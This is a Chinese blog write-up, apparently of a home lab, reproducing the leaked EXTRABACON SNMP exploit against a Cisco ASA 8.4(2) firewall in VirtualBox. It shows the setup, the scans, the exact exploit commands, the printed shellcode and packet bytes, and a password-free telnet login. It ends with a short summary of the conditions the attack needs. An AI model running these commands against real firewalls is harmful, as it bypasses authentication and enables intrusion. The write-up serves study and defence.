<p>然后等会就能进入防火墙的终端了<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ciscoasa&gt;en</span><br><span class="line">Password: </span><br><span class="line">ciscoasa#show run</span><br><span class="line"><span class="code">......</span><br><span class="line">interface GigabitEthernet0</span><br><span class="line"> shutdown</span><br><span class="line"> no nameif</span><br><span class="line"> no security-level</span><br><span class="line"> no ip address</span><br><span class="line">!</span><br><span class="line">......</span></span><br></pre></td></tr></table></figure></p>
<p>查看配置会发现VBox的host-only配的DHCP对这防火墙并没有用, 所以只能配静态ip了</p>
<p>因为上面VBox host-only的网卡我配的是<code>192.168.56.1</code>, 所以防火墙我配个<code>192.168.56.150</code></p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">ciscoasa<span class="comment"># conf ter</span></span><br><span class="line">ciscoasa(config)<span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span> NOTICE <span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line"></span><br><span class="line">Help to improve the ASA platform by enabling anonymous reporting,</span><br><span class="line">which allows Cisco to securely receive minimal error and health</span><br><span class="line">information from the device. To learn more about this feature,</span><br><span class="line">please visit: http://www.cisco.com/go/smartcall</span><br><span class="line"></span><br><span class="line">Would you like to enable anonymous error reporting to help improve</span><br><span class="line">the product? [Y]es, [N]o, [A]sk later: y</span><br><span class="line"></span><br><span class="line">Enabling anonymous reporting.</span><br><span class="line">Adding <span class="string">"call-home reporting anonymous"</span> to running configuration...</span><br><span class="line">Creating trustpoint <span class="string">"_SmartCallHome_ServerCA"</span> and installing certificate...</span><br><span class="line"></span><br><span class="line">Trustpoint '_SmartCallHome_ServerCA' is a subordinate CA and holds a non self-s.</span><br><span class="line"></span><br><span class="line">Trustpoint CA certificate accepted.</span><br><span class="line"></span><br><span class="line">Please remember to save your configuration.</span><br><span class="line"></span><br><span class="line">ciscoasa(config)<span class="comment"># int G0</span></span><br><span class="line">ciscoasa(config-if)<span class="comment"># ip address 192.168.56.150 255.255.255.0</span></span><br><span class="line">ciscoasa(config-if)<span class="comment"># nameif inside</span></span><br><span class="line">ciscoasa(config-if)<span class="comment"># no shut</span></span><br><span class="line">ciscoasa(config-if)<span class="comment"># exit</span></span><br><span class="line">ciscoasa(config)<span class="comment"># exit</span></span><br><span class="line">ciscoasa<span class="comment"># show run</span></span><br><span class="line">......</span><br><span class="line">interface GigabitEthernet0</span><br><span class="line"> nameif inside</span><br><span class="line"> security-level 100</span><br><span class="line"> ip address 192.168.56.150 255.255.255.0</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>配置ip成功, 然后试着ping<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">ciscoasa</span># <span class="tag">ping</span> 192<span class="class">.168</span><span class="class">.56</span><span class="class">.1</span></span><br><span class="line"><span class="tag">Type</span> <span class="tag">escape</span> <span class="tag">sequence</span> <span class="tag">to</span> <span class="tag">abort</span>.</span><br><span class="line"><span class="tag">Sending</span> 5, 100<span class="tag">-byte</span> <span class="tag">ICMP</span> <span class="tag">Echos</span> <span class="tag">to</span> 192<span class="class">.168</span><span class="class">.56</span><span class="class">.1</span>, <span class="tag">timeout</span> <span class="tag">is</span> 2 <span class="rule"><span class="attribute">seconds</span>:<span class="value"></span><br><span class="line">?????</span><br><span class="line">Success rate is <span class="number">0</span> percent (<span class="number">0</span>/<span class="number">5</span>)</span></span></span><br></pre></td></tr></table></figure></p>
<p>是GG的, 需要重启下<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ciscoasa<span class="comment"># copy running-config startup-config</span></span><br><span class="line"></span><br><span class="line">Source filename [running-config]? </span><br><span class="line">Cryptochecksum: <span class="number">7</span>ab821ac df1697e5 <span class="number">257673</span>c1 <span class="number">49832288</span> </span><br><span class="line"></span><br><span class="line"><span class="number">5670</span> <span class="keyword">bytes</span> copied <span class="operator">in</span> <span class="number">0.20</span> <span class="built_in">secs</span></span><br></pre></td></tr></table></figure></p>
<p>然后可以断电重启了(或者有没有像Linux上/etc/init.d/networking restart的程序? 并不懂, 所以采取了简单明了的硬重启)</p>
<p>然后ping本机查看网络是否通畅:<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ciscoasa&gt; ping <span class="number">192.168</span>.<span class="number">56.1</span></span><br><span class="line">Type <span class="built_in">escape</span> sequence <span class="keyword">to</span> abort.</span><br><span class="line">Sending <span class="number">5</span>, <span class="number">100</span>-byte ICMP Echos <span class="keyword">to</span> <span class="number">192.168</span>.<span class="number">56.1</span>, timeout <span class="keyword">is</span> <span class="number">2</span> second<span class="variable">s:</span></span><br><span class="line">!!!!!</span><br><span class="line">Success rate <span class="keyword">is</span> <span class="number">100</span> percent (<span class="number">5</span>/<span class="number">5</span>), <span class="built_in">round</span>-trip <span class="built_in">min</span>/avg/<span class="built_in">max</span> = <span class="number">1</span>/<span class="number">1</span>/<span class="number">1</span> ms</span><br></pre></td></tr></table></figure></p>
<p>接下来就是开服务了, 根据漏洞描述, 防火墙需要开启ssh/telnet 和 snmp服务, 通过snmp的漏洞让ssh/telnet不需要密码即可登陆, 默认情况下, 这些服务器都是关闭的, 需要我们手动开始</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 开启telnet服务, 允许任何主机访问</span><br><span class="line">ciscoasa(config)# telnet 0.0.0.0 0.0.0.0 <span class="keyword">inside</span></span><br><span class="line"># 开始snmp服务, 允许192.168.56.1主机访问</span><br><span class="line">ciscoasa(config)# snmp-server host <span class="keyword">inside</span> 192.168.56.1 community public</span><br></pre></td></tr></table></figure>
<p>检查是否成功开启<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ nmap <span class="number">192.168</span>.56.150 -p23 -Pn</span><br><span class="line"></span><br><span class="line">Starting Nmap <span class="number">7.01</span> ( <span class="string">https:</span><span class="comment">//nmap.org ) at 2016-09-01 14:34 CST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.56.150</span><br><span class="line">Host is up (<span class="number">0.00024</span>s latency).</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">23</span>/tcp open  telnet</span><br><span class="line"></span><br><span class="line">Nmap <span class="string">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.05</span> seconds</span><br><span class="line"></span><br><span class="line">$ sudo nmap <span class="number">192.168</span>.56.150 -p161 -sU</span><br><span class="line"></span><br><span class="line">Starting Nmap <span class="number">7.01</span> ( <span class="string">https:</span><span class="comment">//nmap.org ) at 2016-09-01 14:36 CST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.56.150</span><br><span class="line">Host is up (<span class="number">0.00020</span>s latency).</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line"><span class="number">161</span>/udp open  snmp</span><br><span class="line">MAC <span class="string">Address:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">89</span>:<span class="number">2</span><span class="string">B:</span><span class="number">96</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap <span class="string">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.82</span> seconds</span><br></pre></td></tr></table></figure></p>
<p>然后可以使用方程式泄露的PoC打打看:<br><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">$ python extrabacon_1.1.0.1.py info -t 192.168.56.150 -c public</span><br><span class="line">WARNING: No route found for IPv6 destination :: (no default route?)</span><br><span class="line">Logging to /EXPLOITS/EXBA/concernedparent</span><br><span class="line">[+] Executing:  extrabacon_1.1.0.1.py info -t 192.168.56.150 -c public</span><br><span class="line">[+] probing target via snmp</span><br><span class="line">[+] Connecting to 192.168.56.150:161</span><br><span class="line"><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">[+] response:</span><br><span class="line"><span class="comment">###[ SNMP ]###</span></span><br><span class="line">  version   = <span class="variable">&lt;ASN1_INTEGER[1L]&gt;</span></span><br><span class="line">  community = <span class="variable">&lt;ASN1_STRING['public']&gt;</span></span><br><span class="line">  \PDU       \</span><br><span class="line">   |<span class="string">###[ SNMPresponse ]###</span><br><span class="line">   </span>|<span class="string">  id        = &lt;ASN1_INTEGER[0L]&gt;</span><br><span class="line">   </span>|<span class="string">  error     = &lt;ASN1_INTEGER[0L]&gt;</span><br><span class="line">   </span>|<span class="string">  error_index= &lt;ASN1_INTEGER[0L]&gt;</span><br><span class="line">   </span>|<span class="string">  \varbindlist\</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">###[ SNMPvarbind ]###</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">  oid       = &lt;ASN1_OID['.1.3.6.1.2.1.1.1.0']&gt;</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">  value     = &lt;ASN1_STRING['Cisco Adaptive Security Appliance Version 8.4(2)']&gt;</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">###[ SNMPvarbind ]###</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">  oid       = &lt;ASN1_OID['.1.3.6.1.2.1.1.3.0']&gt;</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">  value     = &lt;ASN1_TIME_TICKS[93000L]&gt;</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">###[ SNMPvarbind ]###</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">  oid       = &lt;ASN1_OID['.1.3.6.1.2.1.1.5.0']&gt;</span><br><span class="line">   </span>|<span class="string">   </span>|<span class="string">  value     = &lt;ASN1_STRING['ciscoasa']&gt;</span><br><span class="line"></span><br><span class="line">[+] firewall uptime is 93000 time ticks, or 0:15:30</span><br><span class="line"></span><br><span class="line">[+] firewall name is ciscoasa</span><br><span class="line"></span><br><span class="line">[+] target is running asa842, which is supported</span><br><span class="line">Data stored in key file  : asa842</span><br><span class="line">Data stored in self.vinfo: ASA842</span><br><span class="line"></span><br><span class="line">To check the key file to see if it really contains what we're claiming:</span><br><span class="line"># cat /EXPLOITS/EXBA/keys/dc9d0q.key</span><br><span class="line"></span><br><span class="line">To disable password checking on target:</span><br><span class="line"># extrabacon_1.1.0.1.py exec -k dc9d0q -t 192.168.56.150 -c public --mode pass-disable</span><br><span class="line"></span><br><span class="line">To enable password checking on target:</span><br><span class="line"># extrabacon_1.1.0.1.py exec -k dc9d0q -t 192.168.56.150 -c public --mode pass-enable</span></span><br></pre></td></tr></table></figure></p>
<p>第一步是主机信息探测, 接下来就是攻击了, 他的作用是可以无需密码使用telnet/ssh 连接防火墙:<br><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ telnet 192.168.56.150</span><br><span class="line">Trying 192.168.56.150...</span><br><span class="line">Connected to 192.168.56.150.</span><br><span class="line">Escape character <span class="keyword">is</span> '^]'.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User Access Verification</span><br><span class="line"></span><br><span class="line">Password: </span><br><span class="line">Password: </span><br><span class="line">Password: Connection <span class="keyword">closed</span> by foreign host.</span><br></pre></td></tr></table></figure></p>
<p>先看没攻击前, 是没法连上的</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">$ python  extrabacon_<span class="number">1.1.0.1</span>.py exec -k dc9d0q -t <span class="number">192.168.56.150</span> -c public --mode pass-disable</span><br><span class="line">WARNING: No route found for IPv6 destination <span class="number">::</span> (no default route?)</span><br><span class="line">Logging to /EXPLOITS/EXBA/concernedparent</span><br><span class="line">[+] Executing:  extrabacon_<span class="number">1.1.0.1</span>.py exec -k dc9d0q -t <span class="number">192.168.56.150</span> -c public --mode pass-disable</span><br><span class="line">Data stored in self.vinfo: ASA842</span><br><span class="line">[+] generating exploit for exec mode pass-disable</span><br><span class="line">[+] using shellcode in ./versions</span><br><span class="line">[+] importing version-specific shellcode shellcode_asa842</span><br><span class="line">[+] building payload for mode pass-disable</span><br><span class="line">appended PMCHECK_DISABLE payload bfa<span class="number">5a5a5a5</span>b<span class="number">8d8a5a5</span>a531f8bba525f6ac31fbb<span class="number">9a5b5a5</span>a531f9baa<span class="number">2a5a5a53</span>1facd80eb14bff<span class="number">08f530931</span>c9b104fcf<span class="number">3a4e90c00</span>00005eebece8f8ffffff<span class="number">31c040c3</span></span><br><span class="line">appended AAAADMINAUTH_DISABLE payload bfa<span class="number">5a5a5a5</span>b<span class="number">8d8a5a5</span>a531f8bba5b5adad31fbb<span class="number">9a5b5a5</span>a531f9baa<span class="number">2a5a5a53</span>1facd80eb14bfe<span class="number">013080831</span>c9b104fcf<span class="number">3a4e90c00</span>00005eebece8f8ffffff<span class="number">31c040c3</span></span><br><span class="line">[+] random SNMP request-id <span class="number">527684062</span></span><br><span class="line">[+] fixing offset to payload 50</span><br><span class="line">overflow (112): <span class="number">1.3.6.1</span>.<span class="number">4.1.9.9</span>.<span class="number">491.1.3</span>.<span class="number">3.1.1.5</span>.<span class="number">9.95.184.67</span>.<span class="number">123.122.173.53</span>.<span class="number">165.165.165.165</span>.<span class="number">131.236.4.137</span>.<span class="number">4.36.137.229</span>.<span class="number">131.197.72.49</span>.<span class="number">192.49.219.179</span>.<span class="number">16.49.246.191</span>.<span class="number">174.170.170.170</span>.<span class="number">129.247.165.165</span>.<span class="number">165.165.96.139</span>.<span class="number">132.36.224.1</span>.<span class="number">0.0.4.50</span>.<span class="number">255.208.97.195</span>.<span class="number">144.144.144.144</span>.<span class="number">144.144.144.144</span>.<span class="number">144.144.144.144</span>.<span class="number">144.144.144.144</span>.<span class="number">144.144.144.144</span>.<span class="number">144.144.144.144</span>.<span class="number">144.144.144.144</span>.<span class="number">25.71.20.9</span>.<span class="number">139.124.36.20</span>.<span class="number">139.7.255.224</span>.144</span><br><span class="line">payload (133): bfa<span class="number">5a5a5a5</span>b<span class="number">8d8a5a5</span>a531f8bba525f6ac31fbb<span class="number">9a5b5a5</span>a531f9baa<span class="number">2a5a5a53</span>1facd80eb14bff<span class="number">08f530931</span>c9b104fcf<span class="number">3a4e90c00</span>00005eebece8f8ffffff<span class="number">31c040c3</span>bfa<span class="number">5a5a5a5</span>b<span class="number">8d8a5a5</span>a531f8bba5b5adad31fbb<span class="number">9a5b5a5</span>a531f9baa<span class="number">2a5a5a53</span>1facd80eb14bfe<span class="number">013080831</span>c9b104fcf<span class="number">3a4e90c00</span>00005eebece8f8ffffff<span class="number">31c040c3</span>c3</span><br><span class="line">EXBA msg (370): <span class="number">3082016e02</span><span class="number">010104067075</span><span class="number">626c6963</span>a<span class="number">582015f02</span><span class="number">041f73d1</span>de<span class="number">02010002010130</span><span class="number">82014f308191</span><span class="number">06072b060102</span><span class="number">010101048185</span>bfa<span class="number">5a5a5a5</span>b<span class="number">8d8a5a5</span>a531f8bba525f6ac31fbb<span class="number">9a5b5a5</span>a531f9baa<span class="number">2a5a5a53</span>1facd80eb14bff<span class="number">08f530931</span>c9b104fcf<span class="number">3a4e90c00</span>00005eebece8f8ffffff<span class="number">31c040c3</span>bfa<span class="number">5a5a5a5</span>b<span class="number">8d8a5a5</span>a531f8bba5b5adad31fbb<span class="number">9a5b5a5</span>a531f9baa<span class="number">2a5a5a53</span>1facd80eb14bfe<span class="number">013080831</span>c9b104fcf<span class="number">3a4e90c00</span>00005eebece8f8ffffff<span class="number">31c040c3</span>c<span class="number">33081b80681</span>b<span class="number">32b0601040109</span><span class="number">09836b01030</span><span class="number">3010105095</span>f<span class="number">8138437b7</span>a<span class="number">812d358125</span><span class="number">812581258125</span><span class="number">8103816c04</span><span class="number">810904248109</span><span class="number">816581038145</span><span class="number">483181403181</span><span class="number">5b81331031</span><span class="number">8176813f81</span><span class="number">2e812a81</span><span class="number">2a812a81</span><span class="number">01817781258125</span><span class="number">81258125608</span><span class="number">10b81042481</span><span class="number">600100000432</span><span class="number">817f81506</span><span class="number">18143811081108</span><span class="number">110811081108110</span><span class="number">8110811081108</span><span class="number">110811081108110</span><span class="number">8110811081108</span><span class="number">110811081108110</span><span class="number">8110811081108</span><span class="number">110811081108110</span><span class="number">81101947140</span><span class="number">9810b7c241</span><span class="number">4810b07817</span>f<span class="number">816081100500</span></span><br><span class="line">[+] Connecting to <span class="number">192.168.56.150</span>:161</span><br><span class="line">[+] packet 1 of 1</span><br><span class="line">[+] 0000   <span class="number">30 82 01 6</span>E <span class="number">02 01 01 04</span>  <span class="number">06 70 75 62</span> 6C 69 63 A5   0..n.....public.</span><br><span class="line">[+] 0010   82 01 5F 02 04 1F 73 D1  DE <span class="number">02 01 00 02</span> 01 01 30   .._...s........0</span><br><span class="line">[+] 0020   82 01 4F <span class="number">30 81 91 06</span> 07  2B <span class="number">06 01 02 01</span> 01 01 04   ..O0....+.......</span><br><span class="line">[+] 0030   81 85 BF A5 A5 A5 A5 B8  D8 A5 A5 A5 31 F8 BB A5   ............1...</span><br><span class="line">[+] 0040   25 F6 AC 31 FB B9 A5 B5  A5 A5 31 F9 BA A2 A5 A5   %..1......1.....</span><br><span class="line">[+] 0050   A5 31 FA CD 80 EB 14 BF  F0 8F 53 09 31 C9 B1 04   .1........S.1...</span><br><span class="line">[+] 0060   FC F3 A4 E9 0C 00 00 00  5E EB EC E8 F8 FF FF FF   ........^.......</span><br><span class="line">[+] 0070   31 C0 40 C3 BF A5 A5 A5  A5 B8 D8 A5 A5 A5 31 F8   1.@...........1.</span><br><span class="line">[+] 0080   BB A5 B5 AD AD 31 FB B9  A5 B5 A5 A5 31 F9 BA A2   .....1......1...</span><br><span class="line">[+] 0090   A5 A5 A5 31 FA CD 80 EB  14 BF E<span class="number">0 13 08 08</span> 31 C9   ...1..........1.</span><br><span class="line">[+] 00a0   B1 04 FC F3 A4 E9 0C 00  00 00 5E EB EC E8 F8 FF   ..........^.....</span><br><span class="line">[+] 00b0   FF FF 31 C0 40 C3 C3 30  81 B8 06 81 B3 2B 06 01   ..1.@..0.....+..</span><br><span class="line">[+] 00c0   <span class="number">04 01 09 09</span> 83 6B 01 03  <span class="number">03 01 01 05</span> 09 5F 81 38   .....k......._.8</span><br><span class="line">[+] 00d0   43 7B 7A 81 2D 35 81 25  <span class="number">81 25 81 25</span> <span class="number">81 25 81 03</span>   C&#123;z.-5.%.%.%.%..</span><br><span class="line">[+] 00e0   81 6C <span class="number">04 81 09 04</span> 24 81  <span class="number">09 81 65 81</span> <span class="number">03 81 45 48</span>   .l....$...e...EH</span><br><span class="line">[+] 00f0   <span class="number">31 81 40 31</span> 81 5B 81 33  <span class="number">10 31 81 76</span> 81 3F 81 2E   1.@1.[.3.1.v.?..</span><br><span class="line">[+] 0100   81 2A 81 2A 81 2A 81 01  <span class="number">81 77 81 25</span> <span class="number">81 25 81 25</span>   .*.*.*...w.%.%.%</span><br><span class="line">[+] 0110   <span class="number">81 25 60 81</span> 0B 81 04 24  <span class="number">81 60 01 00</span> <span class="number">00 04 32 81</span>   .%`....$.`....2.</span><br><span class="line">[+] 0120   7F <span class="number">81 50 61 81</span> 43 81 10  <span class="number">81 10 81 10</span> <span class="number">81 10 81 10</span>   ..Pa.C..........</span><br><span class="line">[+] 0130   <span class="number">81 10 81 10</span> <span class="number">81 10 81 10</span>  <span class="number">81 10 81 10</span> <span class="number">81 10 81 10</span>   ................</span><br><span class="line">[+] 0140   <span class="number">81 10 81 10</span> <span class="number">81 10 81 10</span>  <span class="number">81 10 81 10</span> <span class="number">81 10 81 10</span>   ................</span><br><span class="line">[+] 0150   <span class="number">81 10 81 10</span> <span class="number">81 10 81 10</span>  <span class="number">81 10 81 10</span> <span class="number">81 10 19 47</span>   ...............G</span><br><span class="line">[+] 0160   <span class="number">14 09 81 0</span>B 7C 24 14 81  0B 07 81 7F <span class="number">81 60 81 10</span>   ....|$.......`..</span><br><span class="line">[+] 0170   05 00                                              ..</span><br><span class="line">****************************************</span><br><span class="line">[+] response:</span><br><span class="line">###[ SNMP ]###</span><br><span class="line">  version   = &lt;ASN1_INTEGER[1L]&gt;</span><br><span class="line">  community = &lt;ASN1_STRING['public']&gt;</span><br><span class="line">  \PDU       \</span><br><span class="line">   |###[ SNMPresponse ]###</span><br><span class="line">   |  id        = &lt;ASN1_INTEGER[<span class="number">527684062</span>L]&gt;</span><br><span class="line">   |  error     = &lt;ASN1_INTEGER[0L]&gt;</span><br><span class="line">   |  error_index= &lt;ASN1_INTEGER[0L]&gt;</span><br><span class="line">   |  \varbindlist\</span><br><span class="line">   |   |###[ SNMPvarbind ]###</span><br><span class="line">   |   |  oid       = &lt;ASN1_OID['.<span class="number">1.3.6.1</span>.<span class="number">2.1.1.1</span>.0']&gt;</span><br><span class="line">   |   |  value     = &lt;ASN1_STRING['Cisco Adaptive Security Appliance Version 8.4(2)']&gt;</span><br><span class="line">   |   |###[ SNMPvarbind ]###</span><br><span class="line">   |   |  oid       = &lt;ASN1_OID['.<span class="number">1.3.6.1</span>.<span class="number">4.1.99.12</span>.<span class="number">36.1.1.1</span>.<span class="number">116.114.97.112</span>.<span class="number">104.111.115.116</span>.<span class="number">46.112.117.98</span>.<span class="number">108.105.99.46</span>.<span class="number">49.57.50.46</span>.<span class="number">49.54.56.46</span>.<span class="number">53.54.46.49</span>.46.50']&gt;</span><br><span class="line">   |   |  value     = &lt;ASN1_STRING['']&gt;</span><br><span class="line">[+] received SNMP id <span class="number">527684062</span>, matches random id sent, likely success</span><br><span class="line">[+] clean return detected</span><br></pre></td></tr></table></figure>
<p>然后使用telnet登陆看看<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ telnet <span class="number">192.168</span>.56.150</span><br><span class="line">Trying <span class="number">192.168</span>.56.150...</span><br><span class="line">Connected <span class="built_in">to</span> <span class="number">192.168</span>.56.150.</span><br><span class="line">Escape <span class="keyword">character</span> is <span class="string">'^]'</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User Access Verification</span><br><span class="line"></span><br><span class="line">Password: </span><br><span class="line">Type help <span class="operator">or</span> <span class="string">'?'</span> <span class="keyword">for</span> <span class="operator">a</span> list <span class="operator">of</span> available commands.</span><br><span class="line">ciscoasa&gt; en</span><br><span class="line">Password: </span><br><span class="line">ciscoasa<span class="comment"># conf ter</span></span><br><span class="line">ciscoasa(config)<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p>攻击成功</p>
<h2 id="总结">总结</h2><p>从上面环境搭建的过程我们来简单的分析下这漏洞的情况</p>
<ol>
<li>必须开启snmp服务和ssh/telnet, 而防火墙默认是关闭的</li>
<li>snmp服务开启是使用白名单, 而且只能指定单个ip而不能指定整个网段</li>
</ol>
